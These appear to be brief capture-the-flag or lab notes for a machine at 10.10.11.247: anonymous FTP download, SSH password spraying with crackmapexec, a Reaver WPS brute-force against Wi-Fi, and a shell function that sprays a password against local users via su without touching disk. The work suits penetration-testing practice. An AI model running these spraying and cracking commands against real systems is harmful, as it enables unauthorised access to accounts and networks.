Download all from anonymous ftp server:
```shell
wget -r ftp://10.10.11.247
```

Found the password in the tar file.

Check the pdf's with `exiftool`
```shell
cme ssh 10.10.11.247 -u users.txt -p 'password'
```

Scan for networks:
```shell
iwlist scan
```

Found Reaver with linpeas.sh
```shell
reaver -i mon0 -b [MAC] -vv
```

---
# Additional notes
#shell #scripting
Print all users that have shell:
```shell
cat /etc/passwd | grep sh$ | awk -F: '{print $1}'
# option 2:
awk -F: '{if ($NF ~ /sh$/) print $1}' /etc/passwd
```

#shell #spraying
Script for spraying users in function (can be pasted into a terminal and not touch a disk):
```shell
do_spray() {
	users=$(awk -F: '{if ($NF ~ /sh$/) print $1}' /etc/passwd)
	for user in $users; do
		echo "$1" | timeout 2 su $user -c whoami 2>/dev/null
		if [[ $? -eq 0 ]]; then
			return
		fi
	done
}
```

To kill a process
```shell
ps -ef | grep spray
kill -9 [PID]
```


